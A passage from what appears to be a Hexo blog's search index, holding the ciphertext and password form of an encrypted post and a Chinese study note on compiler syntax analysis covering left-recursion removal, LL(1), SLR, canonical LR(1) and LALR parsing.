a91a08851eb13d42f2e7981b638b9c638cf46d286da1ee21ee3e8366b3b1527bc3f4cdda7f09c211b10ce7d83dbf77aeed96a0384216def850b299a910b34590c2880f43992c28d68b80fbd9d209a33de3d653a2d71e4ceec0c273c5958af72e3330a637ff95589e186c0d8b572f725e9f1899114d92e4f9b91bf5ae8e21ffd8e1ecbfe0e9206b76a83c38a3f42ac60fbb07c6870b8c35266615f0c6f0ca49e1aff68f0201a7596346595c8b875e8bb61961750b0045f01fc8a9ed3f1dde8d6045a1a24b0f3eed460a261efd280206eeffd0298f7521f845a9cde0f239b97b00d5d3a8844aca021430534525d98c9e6be84fc8c7f409f9b35c7c38e3b0ce70e30c597f600abbbb176bb18709ace6dea75683860a11bbd0c766cca4601401e738765012446cb78b5223b53e98b6b2b210623766a5ec1b962fc64a1120e37b70b60f576272ed30a429ddf2b152859468c8579c7d1796024d2027cf4ea9fcc3fcc6cf5ea0f9dc4b3b30cfa83206b2de62f271b7ea1b24524eff9756490cfe9156d98ae32c618762a8d47e9ff98abb6880fc378895a60deafcaa07eabeb42fff0c39c08eb0c53aa519068ff55aa7aa30f091b02312519a54be049aa1ed179509bab78a884099e8fa8d11a5ac9bba35b57b8e21738e0347d4aa7f9e07a3c12be79946ceb7a4b3e1833b63f24a5c7d83b60af1e343e88b16d8b6df8ff2b4a79b920219d6667615b1aebd5ef4e14a717d86ffaab2261dd16a6a62bb58e4f670b3e787a3476bb5bcac405b30241335f218d02237a99d449df4becd222ddb3cfaa4cea575881b9bc48afb171b1345f354b0201b3b6f9806a1ad6504c05f2c4a954e2005fdc4ad69301ed13f73c6af190517a69673ac4035ecdc9b1135bebcdbe6a30d7773e495ceb7f4dfe88af47e8d7eb5640deab06e8724d58045108cbc408dc6d49ee5bd7bfa83ea12518407e94dc129447b2243d9f261c20f0301020bb1001aaae829dd1b3e04c1cd4a2cf9a67b6d3350b57bd542fe2485a6b3e109e729b6b1093708f7e67325cf3f1f9f4e9e0507f8a0d9ea0e70d25cc4db79d83bfe667067573f9aff0e60de3ab640224df6337af047b376a3cc199cbf683c65e878238245df17507450d91c38dfa0a8ab4b6eb222b6e9d5b112d9f19f537fcd57ae329ca23a185456d54583af8e05f90e57ef20d9674c717612d70a6d74da3bd5aaf3f04f8fddd5fca086416ad5f9f41a7e6f7fb36057f09ad0dfd387fd1c5036be52f401f86be49582311530532172e53d3a36be58bf35357a0a9dda9c771da8855c4a94e4b62087b8267256356d64092a01ce7c932f3c944791c9ca4eebfa2873764e2a20e805ba565efbe8635045e649797fc82235737ef3c3a5a8f7f9d026c6650fedbf515fc135e8c3f746ab4a15a340cf39607cfc7397b85a573bfbed5db21e6d99658d1fbbc7407f470a4c0e4aded1e2f1038a01e053c5be987a61c96aec5ba167ec8faa2ccca78e3cedd21c68499b2f5b7a38e305459e062f974b9c27a6ae30c58b15d8c099232578a92c800aa91491a5da446c7bf881591e3cc805bf1f11676a7790dc20b222b9246ad3ac880ffcd1baac6bfa995e8e6df596025b31cf63815d86be63818951ab1d4c72abeb765a5a7fff77e465dc725a55e7574011b9f0cc7133e9c3a1ae495a1a8a8dfafb66a254c223920de19f4de0317690c5a7f4059ddc9a23e9b27f14e78c1c59d3a3db039b831c59732ecd7f613f030083b9f215a7b30f0058dc48ced12292cb67733d870966df487a4cf2d250f687071a2f9edafe746e371bb21172472195474f5c8e390a98922bc4978545d1c5c93a78def1b5488e4282f065ff01f31230ab86315fa924876363b5115a09f1a5eec305c0a8d288863ffb351bea102e5582b58d596c8791aa5d6cdc194465605d4c2de2826ec54afcd5ad003167821db75dd088a0fc1199407840020a995c29b378a8d5883cc39f2aa76919aef725d0f1ca1d9c47f0ad0cc4dc06715db4e8ed60ebf4a8bffb3f834a7bb3c0f420adf667591a30d05483665051a43bf019ffd443fd654c9337c40e215b0417b397aa399994266b3b12e93e06018bacc012fc1916fc59298da80039024ba6f48bf5944d8942604472665effff81363fc34c86341c8856bdc5076adc29c24c2b14b2f8c8ec28815fd9421da742ca838587ae7274e82161f38922db2be4fa08c5c864d0b31f7d5a451db55c2e40eec1c0de66b0ccfc10a108572d5121b178f1c3957d58198df69149630886fbe1f03d03065b5e074d0b506a4fcfd80fc797188ef538db592b0085194581452e5bf3870f8a9b529aaa6ccb12b99a7910febebea6d449813abb598c6a348a16852ea6abba58599aba9273ba8dc36743b07b519c282cf74c072f65ed43aebb47b452f1e5690b08491e0e5d07927ec653a626b4931b62b14fb54edbc46bcb9c3708ad000b459885582096830ad8316344b8415970dd332d7415d8424bc594b95bfbaf0cc206acb4b38a8f062bd760a47e950adab016b5d7a2c2651aced66608cca40ecf64e69d6082c170fc8dc64550d274236b307e51933bba3747fb520de0d59e4b5153e47324c110c5929a1e07673f7b235c2c03d5e3186ca8ea8ffec83ba9228270e1176d0cfa4f24885bb7c6955f72f5c8f55d2cdf8adb54405f50c4ab94c7d41c931b930730e32778a4f7e76f4161bcd2548a2b4890fd35c43f2211b2561c6250dfe719a49ec71deff119a94e3a7877eb82a4490fc93e7073be86c9371bb6280f6d0d8722d42e8bdf6aa1cdc657aa143f0617253001fff699bcd810e24d1577098a97eb819f67be64ee330cbb68bf786836e8f8c15d202d6368343f3f53aeefba3dacfb8c3f61ce4a5058d7c019fe1111476a236a3cea08abea3a1308b97d9eed98b24eb5a46754d18d094d122b598f448aefdabb37014389c0e8dc43ba14b5a966e87302e3cc90a35f9c582b39dd28e29f4b35a0f2c9d16c8fdeaef9c6a5aae21332c0d97900e50f4ae31d90dc2c823433d4f3ed56422e51dff9800cebaa522cdcd2307e567bd0d274ea545bd9388e29026da50ad7025a6d3b44f080b4aaf55b9f15484c888bc84f78017b1f4ef5bfcedbfb31e3b69b57b473e2b149057c7eb844e541fd17a95c25bd679be9704fdbd50efca549365dbd144e75fb15d9d033c6cfb2174184df7a3589772e30f0804e8f7030f603060a3f8ef35af4af956ce697d0c526a9f0927bba038f4b454bcb438bd4c4d8b27ab572c66c26b51238238a23b40e3af58ee3a9001574a1f6bc77bbc0f0493f2873687f53538c6894de7a6159c7514ae2ae9a92dbf26f961191f7659e78de3ebfbd7373bd9d91eb08abbd0bd473105661b6091c6cbe923565ea943b6dc765d7a20e1a6f3ac285b7f0f8c1a489c5451996c7d571b3fc2704dbd38ccd785fd7f8e88bfdaedc158e9fa6268627016239388cfa2635baaa236472c1fbe4aa302197edeeacf402b846aabc39ef42573b9eae026943abf3a4b507c14d8d988ccd0743b763cd2ca96981dd0f1de12668aba9a46296f2a7c711a3a27a69e12b3ef7c0082a94311f93ec1a1d5df423539eee6c3fa48551a94d49d1287950129a19c739c08894a1be0227673696465ff7735d41fadde09598a1e5a89e353730e8c0069b0c1d6684e6ca2743b3b9b84cffbf8fc066b59a8aef0ec99f87346c5df60a514efe2ab2880f648712271930fe3355bc8f69ed4e2bb17d7760f52a99f93eaec6d18b7c7651ff30404d5c12b96d14cae26df1ea0596941e2d1d7fc63c2860b3ffe3050a73765c4ca28f9e82ceb5bf5b24f38b33629bd88205fc210901c8c3f26de6b3339ee23aba9fe708431996b910213018e6f962835c4cdf18a8f91763536c7c1562b62b99dcbbb3f8d34f4c24a3dd239ca4974aa5fac31cbd91573c2c69352f83259984688843da17e51065a094ab780d759144fb4bd0b2a363810ff0a7271212eb66c849dfb7581539ae11798d7f24952c5a20cd5a1edbaeceeea72efbddfb97aaafee3588cd59bdb9c9d5b2a381eee2c99b07ca00e8ea13fe4ee941125025a9968244076634937e84779459927e1d3622f017b3848b13061f5345ab9ddaa7a0ab60111d56f55106021c1a8cf975c776e39574cc0e7797292dc091201eab3bf1cbd1674b26e38734ac0dc528b2671b4f045a7fef1652067cf70b37eda99340f5bc705851dc752bad30f2f99b034b1948ceeede4726807dce63a6749a27d6807ec78ae906633414a0681767d7c5052f7bdf1412c644db6825dbf2718903724e18ca7cb8e225516490645130ebc647f32a45f37e5cec6c7e24a96900196933d3747c28b2b38a351a0bca6a39001b8733254bc8c7f346ccc8b746bfd14c9181777b831c64806d0ccd404f3ae6a408e40051fc521498497cd62ab5460e3148650acbe394394b8a8ed05d86875dacc82f615a2a07e225d5fc2e0afb2a915070d1cc92263a0366b747efb9bbd87abaa3d8fc01d4d8383287328243cfa3ce61316b371a9e376c9000a543100e8938e1354c4d0d5aea81926f028259712f2a875dc223f5887740cf7239a102041274d4f923c5301cb605c9a033be0460c406b086aa52350f6ef16b0f730286cd4b5987b96481693b47a10fed86ccbc54d4c93aa0c8e1ac057f9cd219740f2b33f6ffaf7753450507835b4d542cae943600408c5d6d665b6ef4bdc33b1e0d76a7a411011aa009b0307089275e9dc439d88263775bf0be1ba62850087efca139612ea0f41b011c9db7dde98faade0747d79461cdc938d1ff53f6648eea6fbe19225716889c045976cce5bdabd4c2aae2b83efd46215fd80e3758594c14896bb1c7c94ab4a274d4383bda6030290a03e419c23c237776b79cb3b08d83af9130bb57b5884e53af4e0d31714034c9269bcd7ff3a09f6eef0563038130680d50bbb70cc9cc35b87702cce5c3d0bdff4b92f717efc871e03a92e520ae12d9215caaf133844ea462f1e61c7fecb60845eecdbbbc198cbb983b91cf8c0df50062fb48c8e556c5555e2708d89b282fe0029ad5c42d9d82ab0aa2e0e8b0cbf693c721edf9f925f42ae1772503c67f75c50ed192b3f7bb7199a4c47fe07c4a3a3a2c5bd3f9ba6aa0d19cdc75925c413a8d3a3932002517dac4611490b09162b74f8d9fb622713d2ddd4a53b8af56817007534c1bfa6d0878774debef696d14eb1ae1619a1634bf639ed4bca6394586daad05bddb506d334fdc376904885389be4196ed0b70aff5bca87f347dea0d73589a85146e5afbd65274fa56e867c2fe78345017176274701a2dbe974b20e0681937511d74e293497996e58a9aeda6acdc128dd753d59ce801622cd34696626b65a240e30896fad76ccf842ddd0b1876bfa30eef8ac2e99cf14ea23fbddc07fdde1b25f28fee73d0feb643fe124e168898e95c96d2f8f939234c59760cf031a5e29b67da7f72805532feced36dc73960962548dcfab659b8e52948ebf6d66cff1d258008c75ce72b43649d6bbd2eca7f01167a77added4ade85fbb84677e635b5d66db87adf208fea3cd3eb8daad83a4ca7ba29534c2959d72e259685cc614a9b3b616e8b8663e2f4f6ec94cd76f2fd08d8b3645022c89a090988927c2930ec314bc5611d8d2c80b402704ad70d894509f877f8009dba6085b32e93488f733b8f118526a4df688ca477f81d7d1091b242158d71881d538bc2a65c5672eea49408024e23ea1cd17a2170f402c2fcc203560d61b5125527602cd6e0dffd815f2489bb699d938e5425f9ad5c0eec101af436708ed578bed679a2e858bc50061d175f675b99844e18a415a003404e8f60b0905a1bb3f85d6b811eeff9ae3cba3bad4d396ad7ca02200bcf0183bfb51f8c7f46209225d4e82890689f6e8435137e39df4ff154384bc21eed62da048c1a8d0d1d556c7cdc7194d59f46b8e1f9bd8240070bef38c3c753a9daf2d6882dec9f286a7295492d58484646152dc0246723e2f7c8cfb126a3629bc76d447a04eca5a7a56f7bc625de63e11a4456b37eb794183118a3ca8195ec558122800a2256df7fc6d2b632ce83b526a7f5da50f86382abc7326faf16b558fb3dd6a4817e02b91911843d9bcc94c541e367730a95de9eb2516886bc493dbdf9e73fe2dd3bd793bc8e6f394702757afb1f53b36e6927af6116f1dad9cb0423762263663d56aa682151e773d72ba2df945cf45af3d9b79ab8ef930ab7061140ab690f23745510e90ac4a4c148865b528ae3ef9eb51e34e528585595fab8f179f86e5f2af2253d6879b581986c3c4082a8f345f24dda1f529915215ce929ef1b7e631313e4bbf9944e95303a57249bb8e4eff42026d352ffb424d4566911d407b87d55ac09183b17bfb96157a7bd2df8d2e33efaeb2c1748036b2d945636b8f5ec96b60a8316a0e941b74feda5c74cc42a57d75f15c17eec1290ecb258a12255cccd589b910857da412f68af4996b41601097d07ebba97440496d2171a7b07bf9b8ab4bc6ed4ac1275b391e2fb07f865a3811c62f6d987fab3e6ee02e66f7c96903c6f2c55fccdf94fde46762dcdd931f0edebd4a60a9f41c04cc16e3a9bc5c04a95dcec0530480d01d14a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">特定的人,特定的时间</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>语法分析</title>
      <link href="/2023/Syntax-Analysis/"/>
      <url>/2023/Syntax-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h2><p>语法分析器接收词法分析器提供的记号串,检查它们是否能由源程序语言的文法产生.</p><p>语法分析器的输出是对词法分析器产生的记号流的分析树的某种表示.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201353760.png"></p><span id="more"></span><h2 id="上下文无关文法"><a href="#上下文无关文法" class="headerlink" title="上下文无关文法"></a>上下文无关文法</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201357869.png"></p><p>对于文法G产生的语言L(G),当且仅当文法G的开始符号S经过一步或多步推导得到终结符串w时,我们说终结符串w是G的句子.如果两个文法产生同样的语言,则称这两个文法等价.</p><h2 id="分析树和推导"><a href="#分析树和推导" class="headerlink" title="分析树和推导"></a>分析树和推导</h2><p>推导的每一步有两个选择:1)选择被替换的非终结符 2)选择用于替换该终结符的产生式.若每一步都替代最左非终结符的推导,这样的推导叫做最左推导.由最左推导得到的文法符号的串,称为该文法的左句型.</p><p>分析树可以看作推导的图形表示,但其不能显示出替代顺序的选择.比如图中两个E-&gt;id的替代顺序.所以每个分析树都有唯一的最左和最右推导.然而每一个句子不一定只有一个分析树.存在这样句子的文法G称为二义性文法.语法分析器在处理具有二义性的文法时,需要有消除二义性的规则,从而保留唯一一棵分析树.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201408736.png"></p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>实现部分阅读建议: 从文法识别开始阅读,当识别过程中提到文法的某种设计要求或特征时,阅读文法设计对应细节.</p><h2 id="文法设计"><a href="#文法设计" class="headerlink" title="文法设计"></a>文法设计</h2><h3 id="从NFA到上下文无关文法"><a href="#从NFA到上下文无关文法" class="headerlink" title="从NFA到上下文无关文法"></a>从NFA到上下文无关文法</h3><p>挺好理解的,每个状态转移对应一个产生式.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201426926.png"></p><h3 id="文法处理"><a href="#文法处理" class="headerlink" title="文法处理"></a>文法处理</h3><h4 id="消除左递归"><a href="#消除左递归" class="headerlink" title="消除左递归"></a>消除左递归</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201637505.png"></p><p>直接左递归可以用这种方式来消除.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201639863.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201651495.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201652315.png"></p><p>而对于非直接左递归产生式,如:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201645704.png"><br>进行如下的消除算法.<br>简单说说算法的思想:<br>先将所有的非终结符编号1-n,从A1开始对每一个非终结符Ai,对于Ai-&gt;Aj γ的产生式,用Aj的产生式替换Ai-&gt;Aj γ中的Aj,经过N轮后,对于任意产生式Ai-&gt;Aj γ,一定有j &gt;= i.意味着每次推导产生的非终结符的序号一定不小于原非终结符的序号,类似于单调的概念.故无法从一个非终结符推导出它的”祖先”非终结符.</p><p>也就消除(其实是转化)了非直接左递归.之前的消除直接左递归的算法就可以使用了.当然这是从宏观上看的该算法,实际上在算法中每次外循环后都已经消除Ai的非直接左递归,并完成了消除直接左递归的操作.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201644085.png"></p><h4 id="提取左因子"><a href="#提取左因子" class="headerlink" title="提取左因子"></a>提取左因子</h4><p>当不清楚应该用两个选择中的哪个来替换非终结符A时,可改写A产生式来推迟这种决定,直到看见足够多的输入能做出正确选择为止.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201728574.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201728434.png"></p><h3 id="LL-1-文法"><a href="#LL-1-文法" class="headerlink" title="LL(1)文法"></a>LL(1)文法</h3><blockquote><p>Predictive parsers, that is, recursive-descent parsers needing no backtracking,can be constructed for a class of grammars called LL(1). The first “L” in LL(1) stands for scanning the input from left to right, the second “L” for producing a leftmost derivation, and the “1” for using one input symbol of lookahead at each step to make parsing action decisions.</p></blockquote><h2 id="文法识别"><a href="#文法识别" class="headerlink" title="文法识别"></a>文法识别</h2><h3 id="自顶向下语法分析"><a href="#自顶向下语法分析" class="headerlink" title="自顶向下语法分析"></a>自顶向下语法分析</h3><p>自顶向下语法分析的目的是为输入字符串寻找最左推导,或者说,从根节点开始,自上而下,从左到右地为输入字符串建立一棵分析树.</p><h4 id="递归下降语法分析"><a href="#递归下降语法分析" class="headerlink" title="递归下降语法分析"></a>递归下降语法分析</h4><p>递归下降语法分析是自顶向下分析的一般形式,它可能需要回溯,也就是重复地扫描某段输入.</p><p>典型的递归下降语法分析算法:<br>为每个非终结符创建一个函数(procedure).当语法分析器开始分析非终结符A,非终结符A的对应的函数被调用.其选择一个非终结符的推导,若产生式的记号为终结符,右移输入指针表示成功匹配,若为非终结符Xi,调用Xi的函数.该算法用函数调用的栈隐式地记录了非终结符的处理顺序.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201443552.png"></p><p>该算法有两个点需要注意,这两个点也就是导致该算法需要回溯的原因.</p><ol><li>非终结符A可能有多个产生式,如何选择?递归下降语法分析的策略是遍历每一个产生式.</li><li>若选择的产生式不能匹配输入,触发一个non-ultimate failure,该错误使得输入回退到line1,也就是选择产生式的时.这意味着该算法需要在每次遍历选择时保存输入指针的位置.继续遍历,选择一个新的产生式.直到遍历完A的所有产生式,报告一个错误(该句子不是文法的语言).</li></ol><p>该算法有一个问题,对于含有A-&gt;Aa这样产生式的左递归文法,分析器在处理A时,不断的调用A的处理例程,但输入指针并没有前移,形成死循环.详见文法设计部分<code>消除左递归</code></p><h5 id="预测语法分析器"><a href="#预测语法分析器" class="headerlink" title="预测语法分析器"></a>预测语法分析器</h5><p>有的文法可以用不带回溯的递归下降语法分析器来构造.不带回溯的递归下降语法分析器称为预测语法分析器.</p><p>看这样一个例子.当前输入符号是a,此时正在处理的非终结符A有两个产生式:A-&gt;aB,A-&gt;bB,很明显我们应该选择前者,这便是预测,其实可以类比词法分析选择状态转移的过程.(<del>其实不太懂为什么叫预测,词法分析的时候也没DFA见叫预测有限有穷自动机</del>).</p><p>所以我们应该为输入符号和非终结符产生式创建一个关联,称作分析表(当然也有其他的结构).类比于词法分析中将NFA转换成DFA进行模拟,我们应该对文法<code>提取左因子</code>来保证不存在同一非终结符对于输入符号a的多种产生式.</p><h6 id="预测分析表的构造"><a href="#预测分析表的构造" class="headerlink" title="预测分析表的构造"></a>预测分析表的构造</h6><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201813871.png"><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201813745.png"></p><h6 id="表驱动的预测分析算法"><a href="#表驱动的预测分析算法" class="headerlink" title="表驱动的预测分析算法"></a>表驱动的预测分析算法</h6><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201815234.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201815613.png"></p><h3 id="自底向上语法分析"><a href="#自底向上语法分析" class="headerlink" title="自底向上语法分析"></a>自底向上语法分析</h3><p>自根节点向下建立分析树.<br><del>大量概念名词预警</del></p><p>归约: 一个匹配某产生式右部的字符串w被产生式左部替代的过程,推导的逆过程.<br>自底向上语法分析就是将一个句子一步步归约到文法的开始符号.</p><p>从定义可以看出,自底向上语法分析主要解决两个问题:</p><ol><li>什么时候进行归约</li><li>选择哪个产生式进行归约</li></ol><p>句柄: 一个符号串的句柄是和一个产生式右部匹配的字串,且对该字串的归约过程是最右推导逆过程的一步.</p><h4 id="移进归约分析法"><a href="#移进归约分析法" class="headerlink" title="移进归约分析法"></a>移进归约分析法</h4><p>移进归约分析法用栈来保存文法符号,用输入缓冲区来保存要分析的串w,用$来标记栈底和输入串的右端.初始时栈为空.</p><p>语法分析其将零个或多个输入符号压入栈,直到句柄B在栈顶出现为止,然后选择合适的产生式将句柄B归约,重复此过程直到发现错误或栈中只有开始符号且输入为空.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271156763.png"></p><p>选用栈来进行移进归约分析基于这样一个事实: 句柄总是出现在栈顶而不是栈中.<br>其实就是非终结符总是出现在上一个右句型的左部.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271159720.png"></p><p>但对于一些上下文无关文法,根据栈中的内容和下一个输入符号不能决定是移进还是归约,或不能决定按哪一个产生式进行归约,如二义性文法.这类文法不属于<code>LR(k)</code>类文法.</p><h5 id="算符优先语法分析"><a href="#算符优先语法分析" class="headerlink" title="算符优先语法分析"></a>算符优先语法分析</h5><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241539917.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241539926.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241540363.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541942.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541131.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541341.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241542555.png"></p><h5 id="LR语法分析"><a href="#LR语法分析" class="headerlink" title="LR语法分析"></a>LR语法分析</h5><p>为什么选择LR语法分析?简单来说就是,广泛有效性.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271218831.png"></p><p>LR语法分析器通过记录当前状态(state)来决定移进归约的操作,状态是项目(item)的集合,项目指示对某个产生式的识别状态(区分于语法分析器的状态).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271355698.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271355785.png"></p><blockquote><p>One collection of sets of LR(0) items,called the canonical LR(0) collection,provides the basis for constructing a deterministic finite automaton that is used to make parsing decisions.Such an automatonis called an LR(0) automaton.</p></blockquote><h6 id="SLR语法分析"><a href="#SLR语法分析" class="headerlink" title="SLR语法分析"></a>SLR语法分析</h6><p>LR语法分析器依靠自动机来完成移进归约操作的决定,<br>LR(0)规范集,其实就是LR语法分析器状态的集合(项目(item)集合(set)的集合(collection)),是构造该自动机的基础.</p><p>为文法G构造LR(0)规范集,需要增广文法,闭包(closure)函数,转移(goto)函数.</p><p>拓广文法: 加入一个新的开始符号和产生式S’ -&gt; S,使得仅当S归约到S’时到达接受状态.(原开始符号可能有多个产生式,也就有多种归约能到达接受状态)</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271423144.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271430616.png"></p><p>解释一下闭包函数的作用:<br>    对于项目E’ -&gt; ·E,指示了语法分析器此刻期望从输入中得到E(回忆一下,项目指示了对某产生式的识别状态),当然,如果存在产生式E-&gt;T,分析器同样可能期望得到一个T.为了节约存储空间,我们使用closure来计算出分析器在某状态时的项目集合,指示当前状态所有可能期望得到的串.<br>    <img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271431598.png"><br>这里再引入两个概念,核心项目和非核心项目.非核心项目可以通过对核心项目求闭包来重新生成.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271438905.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271453632.png"><br>GOTO(I,X)就是在状态I识别到文法符号X后到达的新状态.<br>看这样一个例子:<br>在状态I识别到符号+,状态I的项目(后文在说状态的项目时默认是求闭包后的结果)中期待得到符号+的项目只有E-&gt;E· +T,识别+后称为E-&gt;E+ · T,则新状态应该是项目E-&gt;E+ · T的闭包.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271512338.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271515732.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271541992.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271541791.png"></p><p>LR(0)语法分析器的识别过程.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271537409.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271535052.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271539985.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271540363.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271540956.png"></p><p>活前缀的有效项目,我的理解,有效项目指示当前栈中活前缀在遇到下一个文法符号β时的动作,若β为ε,则归约,否则移进.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271620179.png"></p><h6 id="规范LR-1"><a href="#规范LR-1" class="headerlink" title="规范LR(1)"></a>规范LR(1)</h6><p>SLR语法分析依靠活前缀的有效项目进行归约或移进操作的指示,然而对于一些文法,可能有一个活前缀的多个有效项目指示分析器做不同的操作,产生移进-归约冲突.看下面这样一个例子:</p><p>对于如下文法:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311707582.png"><br>构造其LR(0)标准集,其中一个状态是这样的.该状态对于活前缀L且即将识别符号=时,有两个有效的项目分别指示移进和归约.语法分析器不能决定.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311707718.png"><br>然而该冲突其实并不存在,因为文法中不存在以R=开始的右句型(=不在FOLLOW(R)中),所以应该选择移进操作.由此可见,如果让状态蕴含更多的信息,可以解决这样的冲突.</p><p>回顾一下在自顶向下分析中,我们解决推导冲突的办法: 提取左因子,合并状态,也可以说成减少状态蕴藏的信息,得到唯一的状态转换.<br>在这里正好逆一下,分裂状态,使状态蕴含更多的信息,得到唯一的状态转换.</p><blockquote><p>同样是消除冲突,为什么会有相反的两种思想?</p><blockquote><p>本质上是相同的,减少目标状态信息,增加当前状态信息.解决推导冲突所需要的信息,在多个输入符号之后,所以我们暂时减少目标状态的信息以推迟决定,直到当前状态搜集到足够多能做出决定的信息.而解决(类似示例中的)归约冲突所需要的信息,存在于文法本身,若文法设计本身不存在这样的归约冲突,语法分析器便可根据文法本身解决问题,所以要做的就是从文法中产生这样的信息并保存到状态中.</p></blockquote></blockquote><p>规范LR(1)语法分析的项目:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311744785.png"></p><p>还记得我们说SLR语法分析依靠活前缀的有效项目进行归约或移进操作的指示吗?规范LR(1)可以理解为提高了有效项目的要求.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311745101.png"></p><p>规范LR(1)项目集的构造<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311749511.png"></p><p>规范LR(1)分析表的构造<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311752329.png"></p><h6 id="LALR"><a href="#LALR" class="headerlink" title="LALR"></a>LALR</h6><p>为了减少规范LR语法分析表的大小,使用一种LALR的分析方法.</p><p>来看这样一个文法和对应的规范LR的GOTO图.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311805400.png"></p><p>状态I4和I7都只有一个项目<br>对于状态I4,当下个文法符号是c或d时,根据项目的第一分量(产生式)进行归约,对于状态I7,当下个文法符号是$时同样根据项目第一分量进行归约,而这两个第一分量(core)相同.所以我们可以合并这两个状态,而不破坏原本对分析器的指示.<br>(这样的合并可能会延后错误的发现,但不会遗漏).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310312058793.png"></p><p>来分析一下这样合并的有效性:</p><blockquote><p>是否会引进移进-归约冲突?</p><blockquote><p>不会.进行合并的状态的项目一定有相同的core,对一个core而言,是如何决定进行移进还是归约的?根据·是否到了产生式的结尾.也就是只和core有关而与第二分量无关.有的人可能会说,归约的条件还有一个下一文法符号符合第二分量,但在限定了对一个core而言,这其实是决定归约或报告错误,与移进无关.若合并后存在移进-归约冲突,说明该冲突本身就存在于规范LR(1)分析中,该文法不是LR(1)文法.</p></blockquote><p>是否会引进归约-归约冲突?</p><blockquote><p>可能会.在规范LR(1)中,如何决定进行归约的产生式?由第二分量决定.对于这样两个即将被我们合并的状态,各自在识别下一个符号e和d的时候能够根据第二分量选择正确的产生式,而在合并之后,第二分量相同,无法决定,产生归约-归约冲突.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311904951.png"></p></blockquote></blockquote><p>简易但耗空间的LALR表的构造.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311915957.png"></p><p>更efficient的构造方式,还是利用分析过程中通过对核心项目的计算来减小分析表的大小.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310312119100.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031547552.png"></p><p><img 